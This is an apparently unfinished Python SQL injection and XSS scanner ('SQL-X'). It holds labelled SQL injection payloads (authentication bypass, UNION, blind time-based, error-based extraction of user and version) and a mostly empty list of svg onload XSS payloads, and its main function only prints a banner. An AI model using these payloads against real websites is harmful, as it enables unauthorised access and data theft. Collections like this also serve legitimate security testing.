import requests
import argparse
import urllib.parse
import subprocess
from bs4 import BeautifulSoup

#  --------------------
# | CONSTATES GLOBAIS |
# --------------------

SQLI_PAYLOADS = [
    "'",
    "' OR 1=1 --", # Authentication Bypass (Tautology)
    '" OR 1=1 --', # Authentication Bypass (Tautology)
    "' OR 1=1#", # Authentication Bypass (Tautology)
    "' OR 1=1/*", # Authentication Bypass (Tautology)
    "' OR '1'='1", # Authentication Bypass (Tautology)
    "' OR 1=1-- -", # Authentication Bypass (Tautology)
    "' ORDER BY 1--", # UNION-Based SQLi
    "' ORDER BY 10--", # UNION-Based SQLi
    "' AND 1=1--", # Blind Boolean-Based SQLi
    "' AND 1=2--", # Blind Boolean-Based SQLi
    "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", # Blind Time-Based SQLi
    "x'XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR'z", # Blind Time-Based SQLi
    "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--", # Blind Time-Based SQLi
    "'; IF (1=1) WAITFOR DELAY '0:0:5'--", # Blind Time-Based SQLi,
    "' AND extractvalue(1, concat(0x7e, (SELECT user()), 0x7e))--", # Error-Based SQLi
    "' AND 1=CONVERT(int, (SELECT @@version))--", # Error-Based SQLi
    "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM DUAL))--" # Error-Based SQLi
    
]

XSS_PAYLOADS = [
    "<svg/onload=alert(1)><svg>",
    "<svg onload=alert(1)><svg>",
    "<svg	onload=alert(1)><svg>",
    "<svg onload=alert(1)><svg>",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
]


def banner():
    print("""
 ___________________________________________________
| ================================================= | 
|| ███████╗ ██████╗ ██╗                   ██╗  ██╗ ||
|| ██╔════╝██╔═══██╗██║                   ╚██╗██╔╝ ||
|| ███████╗██║   ██║██║         █████╗     ╚███╔╝  ||
|| ╚════██║██║▄▄ ██║██║         ╚════╝     ██╔██╗  ||
|| ███████║╚██████╔╝███████╗              ██╔╝ ██╗ ||
|| ╚══════╝ ╚══▀▀═╝ ╚══════╝              ╚═╝  ╚═╝ ||
+ ------------------------------------------------- +
| ================== by Hanamaru ================== |                                               
+ -------------------____________------------------ +   

    """)

def main():
    banner()

if __name__ == "__main__":
    main()
